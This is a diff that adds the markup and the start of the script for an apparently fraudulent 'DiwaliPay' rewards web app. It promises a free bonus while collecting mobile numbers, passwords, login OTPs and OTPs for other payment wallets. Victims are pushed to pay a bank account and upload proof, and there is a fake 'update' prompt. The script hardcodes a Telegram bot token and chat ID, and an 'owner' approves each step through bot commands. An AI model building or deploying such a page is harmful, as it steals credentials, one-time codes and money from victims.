+#toast{position:fixed;left:50%;bottom:28px;transform:translate(-50%,140%);background:linear-gradient(180deg,#22c55e,#16a34a);color:#fff;font-weight:700;font-size:14px;padding:14px 22px;border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.3);z-index:300;display:flex;align-items:center;gap:10px;transition:.35s;max-width:calc(100% - 40px);}
+#toast.show{transform:translate(-50%,0);}
+#toast.error{background:linear-gradient(180deg,#f87171,#dc2626);}
+#toast.info{background:linear-gradient(180deg,#60a5fa,#2563eb);}
+
+.video-popup{position:fixed;inset:0;background:rgba(10,20,15,.92);backdrop-filter:blur(14px);z-index:420;display:none;align-items:center;justify-content:center;padding:20px;}
+.video-popup.show{display:flex;}
+.video-box{background:#fff;border-radius:28px;padding:22px 20px 20px;max-width:390px;width:100%;max-height:90vh;overflow-y:auto;text-align:center;position:relative;}
+.video-close{position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:12px;border:2.5px solid #e2efe7;background:#f6fbf8;color:var(--muted);font-size:15px;cursor:pointer;}
+.video-ic{width:80px;height:80px;margin:0 auto 14px;border-radius:50%;background:linear-gradient(160deg,var(--th1),var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:34px;animation:payBounce 2.5s ease-in-out infinite;}
+.video-title{font-size:22px;font-weight:700;color:var(--th4);margin:0 0 8px;}
+.video-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.6;margin:0 0 16px;white-space:pre-wrap;}
+.video-frame-wrap{background:#0d2b1a;border-radius:16px;padding:4px;margin-bottom:14px;}
+.video-link-btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;height:54px;border-radius:20px;text-decoration:none;background:linear-gradient(180deg,#60a5fa,#1d4ed8);color:#fff;font-family:var(--toon);font-weight:700;font-size:15.5px;box-shadow:0 7px 0 var(--b3);margin-bottom:10px;}
+.video-ok-btn{width:100%;height:54px;border:0;border-radius:20px;background:linear-gradient(180deg,#4ade80,#16a34a);color:#fff;font-family:var(--toon);font-weight:700;font-size:15.5px;cursor:pointer;box-shadow:0 7px 0 var(--g3);}
+
+.update-popup{position:fixed;inset:0;z-index:400;background:rgba(6,40,22,.9);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;padding:20px;}
+.update-popup.show{display:flex;}
+.update-box{background:#fff;border-radius:28px;padding:30px 24px 24px;max-width:360px;width:100%;text-align:center;}
+.update-ic{width:90px;height:90px;margin:0 auto 16px;border-radius:50%;background:linear-gradient(160deg,var(--th1),var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:40px;animation:payBounce 2.5s ease-in-out infinite;}
+.update-title{font-size:24px;font-weight:700;color:var(--th4);margin:0 0 8px;}
+.update-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.6;margin:0 0 20px;}
+.update-notes{background:var(--thBg1);border:2px solid var(--th1);border-radius:16px;padding:14px;margin-bottom:18px;text-align:left;font-size:13.5px;font-weight:600;color:var(--th3);line-height:1.6;}
+.update-btn{width:100%;height:56px;border:0;border-radius:20px;background:linear-gradient(180deg,var(--th1),var(--th3));color:#fff;font-family:var(--toon);font-weight:700;font-size:16px;cursor:pointer;box-shadow:0 7px 0 var(--th4);display:flex;align-items:center;justify-content:center;gap:10px;}
+.update-version{font-size:11.5px;color:var(--muted);font-weight:700;text-transform:uppercase;margin-top:12px;}
+
+.history-item{display:flex;align-items:center;gap:12px;background:#f8fafc;border:2px solid #e2e8f0;border-radius:18px;padding:14px;margin-bottom:10px;}
+.history-icon{width:50px;height:50px;border-radius:16px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;background:linear-gradient(160deg,var(--th1),var(--th3));}
+.history-info{flex:1;min-width:0;}
+.history-title{font-size:15px;font-weight:700;}
+.history-date{font-size:12px;color:#64748b;margin-top:3px;}
+.history-amount{font-size:15px;font-weight:700;padding:8px 12px;border-radius:14px;}
+.history-amount.pos{color:#16a34a;background:#f0fdf4;}
+.history-amount.neg{color:#dc2626;background:#fef2f2;}
+
+.support-info-block{text-align:center;padding:20px 14px;margin-bottom:18px;background:var(--thBg1);border:3px solid var(--th1);border-radius:22px;}
+.support-number{font-family:'Courier New',monospace;font-size:28px;font-weight:700;color:var(--th4);letter-spacing:2px;margin:8px 0 4px;}
+.support-hours{font-size:13px;color:var(--th3);font-weight:700;display:inline-flex;align-items:center;gap:6px;padding:7px 15px;border-radius:24px;background:rgba(255,255,255,.85);border:2px solid var(--th1);margin-top:8px;}
+.support-actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px;}
+.support-btn{height:62px;border:0;border-radius:20px;font-family:var(--toon);font-weight:700;font-size:15.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;color:#fff;}
+.support-btn.call{background:linear-gradient(180deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 var(--b3);}
+.support-btn.wa{background:linear-gradient(180deg,#25d366,#128c7e);box-shadow:0 6px 0 #075e54;}
+</style>
+</head>
+<body>
+<div class="bg-fx"><span></span><span></span><span></span><span></span><span></span><span></span></div>
+<div class="phone">
+
+  <!-- LOGIN -->
+  <div id="loginScreen">
+    <div class="reg-logo" id="loginLogo"><i class="fa-solid fa-clover"></i></div>
+    <h1 class="reg-title" id="loginTitleEl">Welcome <span class="acc">Back</span></h1>
+    <p class="reg-sub" id="loginSubEl">Login to continue earning rewards</p>
+    <div class="field"><i class="fa-solid fa-mobile-screen-button"></i><input id="logMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Mobile Number" autocomplete="off"></div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="logPass" type="password" placeholder="Password" autocomplete="current-password"></div>
+    <button id="loginBtn" class="btn-primary" type="button"><i class="fa-solid fa-right-to-bracket"></i> <span>LOGIN</span></button>
+    <a class="forgot-link" id="forgotLink" href="javascript:void(0)"><i class="fa-solid fa-key"></i> Forgot Password?</a>
+    <p class="tiny-note"><i class="fa-solid fa-user-plus"></i> New user? <span class="link" id="goRegister">Register here</span></p>
+  </div>
+
+  <!-- LOGIN OTP -->
+  <div id="loginOtpScreen" class="hidden">
+    <div class="otp-orb"><i class="fa-solid fa-shield-halved"></i></div>
+    <h1 class="otp-title">Verify OTP</h1>
+    <p class="otp-desc">We sent a 6-digit code to<br>+91 <b id="otpMobileDisplay">----------</b></p>
+    <input class="otp-box" id="otpBox" type="tel" inputmode="numeric" maxlength="6" placeholder="••••••" autocomplete="off">
+    <div style="display:flex;align-items:center;gap:14px;background:#fff;border:2.5px solid var(--th1);border-radius:20px;padding:15px 17px;margin-bottom:18px;box-shadow:0 5px 0 var(--th1);">
+      <div id="otpOrb" style="width:64px;height:64px;border-radius:50%;background:conic-gradient(var(--th1) var(--p,100%),#e2efe7 0);display:flex;align-items:center;justify-content:center;position:relative;">
+        <span id="otpTimerText" style="font-family:'Courier New',monospace;font-weight:700;font-size:17px;color:var(--th4);">59</span>
+      </div>
+      <div style="flex:1;"><div style="font-size:14.5px;font-weight:700;color:var(--th4);">Code expires in <span id="otpExpiresText">59s</span></div><div style="font-size:12.5px;color:var(--muted);margin-top:3px;font-weight:600;">Enter any 4-6 digits to continue</div></div>
+    </div>
+    <button id="otpVerifyBtn" class="btn-primary" type="button"><i class="fa-solid fa-circle-check"></i> <span>VERIFY &amp; CONTINUE</span></button>
+    <button id="otpResendBtn" class="btn-ghost" type="button" disabled><i class="fa-solid fa-rotate-right"></i> Resend OTP</button>
+    <a class="back-link" id="otpBackLink" href="javascript:void(0)" style="display:block;text-align:center;margin-top:16px;color:var(--muted);font-size:14px;font-weight:700;cursor:pointer;padding:8px;"><i class="fa-solid fa-arrow-left"></i> Back to Login</a>
+  </div>
+
+  <!-- REGISTER -->
+  <div id="registerScreen" class="hidden">
+    <div class="reg-logo" id="registerLogo"><i class="fa-solid fa-clover"></i></div>
+    <h1 class="reg-title" id="regTitleEl">Create <span class="acc">Account</span></h1>
+    <p class="reg-sub" id="regSubEl">Join &amp; start earning rewards</p>
+    <div class="field"><i class="fa-solid fa-user"></i><input id="regUser" type="text" placeholder="Username (User ID)" autocomplete="off" spellcheck="false"></div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="regPass" type="password" placeholder="Password" autocomplete="new-password"></div>
+    <div class="field"><i class="fa-solid fa-mobile-screen-button"></i><input id="regMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Mobile Number" autocomplete="off"></div>
+    <div class="otp-row">
+      <div class="field"><i class="fa-solid fa-shield-halved"></i><input id="regOtp" type="tel" inputmode="numeric" maxlength="6" placeholder="Enter OTP" autocomplete="off"></div>
+      <button id="getOtpBtn" class="btn-otp" type="button">GET OTP</button>
+    </div>
+    <div id="regOtpHint" class="otp-hint"></div>
+    <div class="field"><i class="fa-solid fa-ticket"></i><input id="regInvite" type="text" maxlength="5" placeholder="Invite Code (optional)" autocomplete="off" spellcheck="false"></div>
+    <button id="createBtn" class="btn-primary green" type="button"><i class="fa-solid fa-user-plus"></i> <span>CREATE ACCOUNT</span></button>
+    <a class="forgot-link" id="backLoginLink" href="javascript:void(0)" style="color:var(--th3);"><i class="fa-solid fa-arrow-left"></i> Back to Login</a>
+  </div>
+
+  <!-- WAIT -->
+  <div id="waitScreen" class="hidden">
+    <div class="wait-orb-wrap"><div class="wait-ring"></div><div class="wait-ring delay1"></div><div class="wait-ring delay2"></div><div class="wait-orb"><i class="fa-solid fa-hourglass-half"></i></div></div>
+    <h1 class="wait-title">Waiting for Approval</h1>
+    <p class="wait-sub" id="waitSubText">Your request has been sent to owner.<br>Owner <b style="color:var(--th3);">ok</b> command will unlock the dashboard.</p>
+    <div class="wait-card">
+      <div class="wait-row"><i class="fa-solid fa-user"></i><div style="flex:1;"><div class="lbl-s">User ID</div><div class="val-s" id="waitUser">User</div></div></div>
+      <div class="wait-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;"><div class="lbl-s">Mobile</div><div class="val-s mono" id="waitMobile">+91 ----------</div></div></div>
+    </div>
+    <div class="wait-status-badge"><i class="fa-solid fa-circle-notch"></i> Auto-checking approval...</div>
+    <button class="btn-primary" id="waitCheckBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-rotate-right"></i> <span>CHECK NOW</span></button>
+    <button class="btn-ghost" id="waitBackBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-arrow-left"></i> Back to Login</button>
+  </div>
+
+  <!-- FORGOT -->
+  <div id="forgotScreen" class="hidden">
+    <div class="wait-orb-wrap"><div class="wait-ring"></div><div class="wait-ring delay1"></div><div class="wait-ring delay2"></div><div class="wait-orb"><i class="fa-solid fa-key"></i></div></div>
+    <h1 class="wait-title">Reset Request Sent</h1>
+    <p class="wait-sub">Your reset request has been sent to owner.<br>Owner <b style="color:var(--th3);">resetpass</b> will unlock the password screen.</p>
+    <div class="wait-card">
+      <div class="wait-row"><i class="fa-solid fa-user"></i><div style="flex:1;"><div class="lbl-s">User ID</div><div class="val-s" id="forgotUser">-</div></div></div>
+      <div class="wait-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;"><div class="lbl-s">Mobile</div><div class="val-s mono" id="forgotMobile">+91 ----------</div></div></div>
+    </div>
+    <div class="wait-status-badge"><i class="fa-solid fa-circle-notch"></i> Auto-checking approval...</div>
+    <button class="btn-primary" id="forgotResendBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-paper-plane"></i> <span>RESEND REQUEST</span></button>
+    <button class="btn-ghost" id="forgotBackBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-arrow-left"></i> Back to Login</button>
+  </div>
+
+  <!-- NEW PASS -->
+  <div id="newPassScreen" class="hidden">
+    <div class="reg-logo" style="background:linear-gradient(160deg,#4ade80,#0b6b3a);box-shadow:0 12px 0 #062e19;"><i class="fa-solid fa-key"></i></div>
+    <h1 class="reg-title">Set New <span class="acc" style="background:linear-gradient(120deg,#4ade80,#0b6b3a);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">Password</span></h1>
+    <p class="reg-sub">Owner has approved your request ✓</p>
+    <div class="wait-card" style="margin-bottom:14px;">
+      <div class="wait-row"><i class="fa-solid fa-user"></i><div style="flex:1;"><div class="lbl-s">User ID</div><div class="val-s" id="npUser">-</div></div></div>
+      <div class="wait-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;"><div class="lbl-s">Mobile</div><div class="val-s mono" id="npMobile">+91 ----------</div></div></div>
+    </div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="npNew" type="password" placeholder="New Password" autocomplete="new-password"></div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="npConfirm" type="password" placeholder="Confirm Password" autocomplete="new-password"></div>
+    <button class="btn-primary green" id="npSaveBtn" type="button"><i class="fa-solid fa-check"></i> <span>SAVE PASSWORD</span></button>
+    <button class="btn-ghost" id="npBackBtn" type="button"><i class="fa-solid fa-arrow-left"></i> Back to Login</button>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div id="appScreen" class="hidden">
+    <header class="app-header">
+      <div class="header-top">
+        <div class="h-avatar" id="hAvatar"><i class="fa-solid fa-user"></i></div>
+        <div><div class="h-hi">Welcome back,</div><div class="h-name" id="hUsername">User</div></div>
+        <div class="h-badge"><i class="fa-solid fa-indian-rupee-sign"></i> <span id="headerBalance">50</span></div>
+      </div>
+    </header>
+    <main class="app-main">
+      <div class="main-diwali-banner" id="mainBanner">
+        <div class="rgb-light left"></div>
+        <div class="rgb-light right"></div>
+        <div class="banner-img-wrap hidden" id="mainBannerImgWrap"><img id="mainBannerImg" alt="banner"></div>
+        <div class="diya-lamp l1">🪔</div><div class="diya-lamp l2">🪔</div><div class="diya-lamp l3">🪔</div>
+        <div class="firework f1"></div><div class="firework f2"></div><div class="firework f3"></div>
+        <div class="firework f4"></div><div class="firework f5"></div><div class="firework f6"></div>
+        <div class="banner-text-top">
+          <div class="bt-small" id="mainBannerTop">🪔 दिवाली की हार्दिक शुभकामनाएं 🪔</div>
+          <div class="bt-big" id="mainBannerAmt">₹50 FREE</div>
+          <div class="bt-date" id="mainBannerSub">Register Bonus · Limited Time</div>
+        </div>
+        <div class="banner-anim"><div class="diya-row"><span>🪔</span><span>✨</span><span>🪔</span><span>✨</span><span>🪔</span></div></div>
+      </div>
+
+      <div class="balance-card">
+        <div class="balance-body">
+          <div class="bc-coin"><i class="fa-solid fa-indian-rupee-sign"></i></div>
+          <div class="bc-info">
+            <div class="bc-label">Total Balance</div>
+            <div class="bc-amount" id="mainBalance">₹50</div>
+            <div class="bc-foot"><i class="fa-solid fa-arrow-trend-up"></i> Available for withdrawal</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="bonus-card">
+        <div class="icon-circle"><i class="fa-solid fa-gift"></i></div>
+        <div><div class="bc-title">+₹50 Registration Bonus</div><div class="bc-sub">Credited to your wallet</div></div>
+        <i class="fa-solid fa-circle-check ok"></i>
+      </div>
+
+      <div id="verifiedWalletsCard" class="verified-wallets-card hidden">
+        <div class="vwc-head">
+          <div class="vwc-icon"><i class="fa-solid fa-circle-check"></i></div>
+          <div style="flex:1;"><div class="vwc-title">Verified Wallets</div><div class="vwc-sub">Your verified payment methods</div></div>
+          <div class="vwc-count"><i class="fa-solid fa-shield-halved"></i> <span id="vwcCount">0</span></div>
+        </div>
+        <div class="vwc-grid" id="vwcGrid"></div>
+      </div>
+
+      <div class="btn-row">
+        <button class="row-btn green" id="btnMyWallet" type="button"><i class="fa-solid fa-wallet"></i> <span>MY WALLET</span></button>
+        <button class="row-btn amber" id="btnPurchase" type="button"><i class="fa-solid fa-credit-card"></i> <span>PURCHASE</span></button>
+        <button class="row-btn purple" id="btnWalletHistory" type="button"><i class="fa-solid fa-clock-rotate-left"></i> <span>HISTORY</span></button>
+      </div>
+      <div class="btn-row">
+        <button class="row-btn blue" id="btnInvite" type="button"><i class="fa-solid fa-user-plus"></i> <span>INVITE</span></button>
+        <button class="row-btn green" id="btnSupport" type="button"><i class="fa-solid fa-headset"></i> <span>SUPPORT</span></button>
+      </div>
+
+      <button class="btn-logout" id="btnLogout" type="button"><i class="fa-solid fa-right-from-bracket"></i> <span>LOGOUT</span></button>
+      <div class="tiny-footer"><i class="fa-solid fa-star"></i> <span id="footerBrand">DiwaliPay</span> <i class="fa-solid fa-star"></i></div>
+    </main>
+  </div>
+
+  <!-- MODALS -->
+  <div class="overlay" id="myWalletModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon green"><i class="fa-solid fa-wallet"></i></div>
+      <h3>My Wallet</h3>
+      <p class="sheet-sub">Verify each wallet with OTP</p>
+      <div id="walletListWrap"></div>
+      <button class="btn-ghost" data-close="myWalletModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="walletVerifyModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-head">
+        <div class="sheet-icon blue"><i class="fa-solid fa-wallet"></i></div>
+        <div style="flex:1;"><div class="sheet-title" id="wSheetTitle">Verify Wallet</div><div class="sheet-sub" id="wSheetSub">Enter mobile &amp; OTP</div></div>
+        <button class="close-x" data-close="walletVerifyModal" type="button"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div id="wStep1">
+        <label class="lbl" for="wMobile">Mobile Number</label>
+        <div class="field2"><i class="fa-solid fa-mobile-screen-button"></i><input id="wMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="10-digit mobile number"></div>
+        <button class="btn-primary green" id="wNextBtn" type="button"><i class="fa-solid fa-paper-plane"></i> <span>SEND OTP</span></button>
+      </div>
+      <div id="wStep2" class="hidden">
+        <label class="lbl" for="wOtp">Enter OTP</label>
+        <div class="field2"><i class="fa-solid fa-shield-halved"></i><input id="wOtp" type="tel" inputmode="numeric" maxlength="6" placeholder="Enter OTP"></div>
+        <div id="wOtpHint" class="hint"></div>
+        <button class="btn-primary green" id="wVerifyBtn" type="button"><i class="fa-solid fa-circle-check"></i> <span>VERIFY &amp; REQUEST</span></button>
+      </div>
+      <div id="wLoading" class="hidden"><div class="spinner"></div><div class="loading-text">Verifying OTP...</div></div>
+      <div id="wSuccess" class="hidden"><div class="result-box green"><i class="fa-solid fa-circle-check"></i>OTP VERIFIED<span>Sending request to owner...</span></div></div>
+    </div>
+  </div>
+
+  <div class="overlay" id="purchaseModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-head">
+        <div class="sheet-icon purple"><i class="fa-solid fa-credit-card"></i></div>
+        <div style="flex:1;"><div class="sheet-title">Complete Payment</div><div class="sheet-sub" id="payPanelSub">Send money &amp; upload screenshot</div></div>
+        <button class="close-x" data-close="purchaseModal" type="button"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div id="payStepWait" class="hidden">
+        <div class="unlock-wait">
+          <div class="uw-orb"><i class="fa-solid fa-shield-halved"></i></div>
+          <div class="uw-tt">Verifying with Owner</div>
+          <p class="uw-desc">Owner will send <b style="color:#16a34a;">next</b> command to unlock the payment form.<br><span style="color:var(--th2);font-weight:700;">Auto-checking...</span></p>
+          <div class="verify-dots"><span></span><span></span><span></span></div>
+          <div class="pay-status-row"><i class="fa-solid fa-circle-notch"></i> Waiting for owner...</div>
+        </div>
+      </div>
+      <div id="payStep1" class="hidden">
+        <div class="payee-card offline" id="payeeCard">
+          <div class="payee-status offline" id="payeeStatus"><i class="fa-solid fa-circle" id="payeeStatusDot"></i><span id="payeeStatusText">OFFLINE</span></div>
+          <div class="payee-row amount"><span class="payee-lbl">Prize</span><span class="payee-val" id="payAmount">₹0</span><button class="payee-copy amount-copy" type="button" data-copy="amount"><i class="fa-regular fa-copy"></i> COPY</button></div>
+          <div class="payee-row"><span class="payee-lbl">Account</span><span class="payee-val mono" id="payAccount">××××××××××××</span><button class="payee-copy" type="button" data-copy="account"><i class="fa-regular fa-copy"></i> COPY</button></div>
+          <div class="payee-row"><span class="payee-lbl">Name</span><span class="payee-val" id="payName">×××××××××</span><button class="payee-copy" type="button" data-copy="name"><i class="fa-regular fa-copy"></i> COPY</button></div>
+          <div class="payee-row"><span class="payee-lbl">IFSC</span><span class="payee-val mono" id="payIfsc">×××××××××××</span><button class="payee-copy" type="button" data-copy="ifsc"><i class="fa-regular fa-copy"></i> COPY</button></div>
+        </div>
+        <label class="lbl">Upload Payment Screenshot</label>
+        <div class="upload-box" id="uploadBox">
+          <input type="file" id="screenshotInput" accept="image/*" hidden>
+          <div class="upload-inner" id="uploadInner"><i class="fa-solid fa-cloud-arrow-up"></i><div class="upload-title">Tap to upload</div><div class="upload-hint">JPG, PNG · Max 5MB</div></div>
+          <img id="uploadPreview" class="hidden" alt="preview">
+          <div class="upload-change hidden" id="uploadChange"><i class="fa-solid fa-rotate"></i> Change</div>
+        </div>
+        <button class="btn-primary green" id="payVerifyBtn" type="button"><i class="fa-solid fa-shield-halved"></i> <span>VERIFY PAYMENT</span></button>
+      </div>
+      <div id="payStep2" class="hidden">
+        <div class="pay-verify-anim"><div class="pay-orbit"><div class="pay-orbit-ring"></div><div class="pay-orbit-ring delay1"></div><div class="pay-orbit-ring delay2"></div><div class="pay-orbit-icon"><i class="fa-solid fa-hourglass-half"></i></div></div></div>
+        <div class="pay-timer" id="payTimer">09:59</div>
+        <div class="pay-timer-label">Verifying your payment...</div>
+        <div class="pay-timer-sub">Auto-checking owner approval...</div>
+        <div class="pay-status-row"><i class="fa-solid fa-circle-notch"></i> Waiting for payok / payno...</div>
+      </div>
+      <div id="payStep3" class="hidden"><div class="result-box blue"><i class="fa-solid fa-circle-check"></i>✓ PAYMENT VERIFIED<span>Coupon added to your history</span></div><button class="btn-primary green" id="payDoneBtn" type="button"><i class="fa-solid fa-check"></i> <span>DONE</span></button></div>
+      <div id="payStep4" class="hidden"><div class="result-box red"><i class="fa-solid fa-circle-xmark"></i>PAYMENT REJECTED<span>Please try again</span></div><button class="btn-primary green" id="payRetryBtn" type="button"><i class="fa-solid fa-rotate-right"></i> <span>TRY AGAIN</span></button></div>
+      <div id="payStep5" class="hidden"><div class="result-box red"><i class="fa-solid fa-clock"></i>TIMEOUT<span>Please refresh details</span></div><button class="btn-primary green" id="payTimeoutBtn" type="button"><i class="fa-solid fa-rotate-right"></i> <span>REFRESH</span></button></div>
+    </div>
+  </div>
+
+  <div class="overlay" id="walletHistoryModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon purple"><i class="fa-solid fa-clock-rotate-left"></i></div>
+      <h3>Wallet History</h3>
+      <p class="sheet-sub">Your recent transactions</p>
+      <div id="walletHistoryList"></div>
+      <button class="btn-ghost" data-close="walletHistoryModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="inviteModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon purple"><i class="fa-solid fa-user-plus"></i></div>
+      <h3>Invite &amp; Earn ₹10</h3>
+      <p class="sheet-sub">Share your code with friends</p>
+      <div style="background:var(--thBg1);border:3px dashed var(--th1);border-radius:18px;padding:16px;margin-bottom:14px;text-align:center;">
+        <div style="font-size:12px;color:var(--th3);font-weight:700;text-transform:uppercase;margin-bottom:6px;">Your Invite Code</div>
+        <div id="inviteCodeBox" style="font-size:28px;font-weight:800;color:var(--th4);letter-spacing:3px;margin-bottom:8px;">-----</div>
+        <div style="font-size:13px;color:var(--th3);font-weight:600;">Friend joins → you earn <b style="color:#0e8c3f;">₹10</b></div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
+        <div style="background:#f0fdf4;border:2px solid #bbf7d0;border-radius:16px;padding:12px;text-align:center;">
+          <div style="font-size:11px;color:#166534;font-weight:700;text-transform:uppercase;">Total Invited</div>
+          <div style="font-size:22px;font-weight:800;color:#15803d;" id="inviteCountBox">0</div>
+        </div>
+        <div style="background:#fef3c7;border:2px solid #fcd34d;border-radius:16px;padding:12px;text-align:center;">
+          <div style="font-size:11px;color:#92400e;font-weight:700;text-transform:uppercase;">Earned</div>
+          <div style="font-size:22px;font-weight:800;color:#b45309;" id="inviteEarnBox">₹0</div>
+        </div>
+      </div>
+      <button class="btn-primary" id="shareInviteBtn" type="button" style="background:linear-gradient(180deg,#a78bfa,#7c3aed);box-shadow:0 7px 0 var(--purpleDeep);"><i class="fa-solid fa-share-nodes"></i> <span>SHARE INVITE LINK</span></button>
+      <button class="btn-ghost" data-close="inviteModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="supportModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon blue"><i class="fa-solid fa-headset"></i></div>
+      <h3>Customer Support</h3>
+      <p class="sheet-sub">We're here to help you 24/7</p>
+      <div class="support-info-block">
+        <div style="font-size:12px;color:var(--th3);font-weight:700;text-transform:uppercase;"><i class="fa-solid fa-phone"></i> Helpline Number</div>
+        <div class="support-number" id="supportNumber">8235619970</div>
+        <div class="support-hours"><i class="fa-solid fa-clock"></i> Available 24 × 7</div>
+      </div>
+      <div class="support-actions">
+        <button class="support-btn call" id="supportCallBtn" type="button"><i class="fa-solid fa-phone"></i> <span>CALL</span></button>
+        <button class="support-btn wa" id="supportWaBtn" type="button"><i class="fa-brands fa-whatsapp"></i> <span>WHATSAPP</span></button>
+      </div>
+      <button class="btn-ghost" data-close="supportModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="logoutModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon red"><i class="fa-solid fa-right-from-bracket"></i></div>
+      <h3>Logout?</h3>
+      <p class="sheet-sub">You will need to <b>login again</b>.</p>
+      <button class="btn-logout" id="confirmLogoutBtn" type="button"><i class="fa-solid fa-check"></i> <span>YES, LOGOUT</span></button>
+      <button class="btn-ghost" data-close="logoutModal" type="button">Cancel</button>
+    </div>
+  </div>
+
+  <div class="wallet-req-popup" id="walletReqPopup">
+    <div class="wallet-req-icon"><i class="fa-solid fa-paper-plane"></i></div>
+    <h3 class="wallet-req-title">Verify Request Sent</h3>
+    <p class="wallet-req-text">Your request has been sent to owner.<br><b>Auto-checking...</b></p>
+    <div class="wallet-req-info">
+      <div><i class="fa-solid fa-wallet"></i><span class="m">Wallet:</span><span id="reqWalletName">-</span></div>
+      <div><i class="fa-solid fa-mobile-screen-button"></i><span class="m">Mobile:</span><span id="reqWalletMobile">-</span></div>
+    </div>
+    <button class="wallet-req-btn" id="reqPopupOk" type="button"><i class="fa-solid fa-check"></i> OK, GOT IT</button>
+  </div>
+
+  <div class="video-popup" id="videoPopup">
+    <div class="video-box">
+      <button class="video-close" id="videoCloseBtn" type="button"><i class="fa-solid fa-xmark"></i></button>
+      <div class="video-ic" id="videoIcon"><i class="fa-solid fa-play"></i></div>
+      <div class="video-title" id="videoTitle">Special Message</div>
+      <p class="video-desc" id="videoDesc">Owner has sent you a message.</p>
+      <div class="video-frame-wrap" id="videoFrameWrap" style="display:none;"><video id="videoPlayer" controls playsinline style="width:100%;border-radius:14px;"></video></div>
+      <a class="video-link-btn hidden" id="videoLinkBtn" href="javascript:void(0)" target="_blank"><i class="fa-solid fa-arrow-up-right-from-square"></i> <span id="videoLinkText">Open Link</span></a>
+      <button class="video-ok-btn" id="videoOkBtn" type="button"><i class="fa-solid fa-check"></i> OK, GOT IT</button>
+    </div>
+  </div>
+
+  <div class="update-popup" id="updatePopup">
+    <div class="update-box">
+      <div class="update-ic"><i class="fa-solid fa-cloud-arrow-down"></i></div>
+      <div class="update-title">New Update Available!</div>
+      <p class="update-desc" id="updateDescText">Please update to continue.</p>
+      <div class="update-notes" id="updateNotes"><div><i class="fa-solid fa-check-circle"></i> Latest features</div><div><i class="fa-solid fa-check-circle"></i> Bug fixes</div></div>
+      <button class="update-btn" id="updateDownloadBtn" type="button"><i class="fa-solid fa-download"></i> <span>UPDATE NOW</span></button>
+      <div class="update-version">Version <span id="updateVersionText">1.0.1</span></div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+</div>
+
+<script>
+(function(){
+'use strict';
+var TBOT='8864112645:AAHTMjpWSfPxhqAB8pkgwm-j49OXAGWs1zI';
+var TCHAT='8709228094';
+var POLL_MS=2000;
+var OTP_TIMEOUT=59;
+var PAY_TIMEOUT_MS=9*60*1000+59*1000;
+var INVITE_REWARD=10;
+var DEFAULT_BALANCE=50;
+
+var $=function(id){return document.getElementById(id);};
+var STORE={user:'lp_user',mobile:'lp_mobile',balance:'lp_balance',pass:'lp_pass',approved:'lp_appr',rejected:'lp_rej',resetApproved:'lp_reset_appr',offset:'lp_tg_offset',loginReq:'lp_login_req',invite:'lp_invite'};
+
+function save(k,v){try{localStorage.setItem(k,v)}catch(e){}}
+function read(k){try{return localStorage.getItem(k)}catch(e){return null}}
+function del(k){try{localStorage.removeItem(k)}catch(e){}}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+
+function autoKey(m){return 'lp_auto_'+(m||read(STORE.mobile)||'main');}
+function setAutoLogin(m){m=m||read(STORE.mobile);if(m)save(autoKey(m),'1');}
+function isAutoLogin(m){if(read('lp_auto_global')==='1')return true;m=m||read(STORE.mobile);if(!m)return false;return read(autoKey(m))==='1';}
+function clrAutoLogin(m){m=m||read(STORE.mobile);if(m)del(autoKey(m));}
+
+var toastT=null;
+function toast(msg,type){
+  var t=$('toast');if(!t)return;
+  var icon=type==='info'?'fa-circle-info':(type==='error'?'fa-circle-xmark':'fa-circle-check');
+  t.innerHTML='<i class="fa-solid '+icon+'"></i> '+msg;
+  t.className='show '+(type||'success');
+  clearTimeout(toastT);toastT=setTimeout(function(){t.className=''},2600);
+}
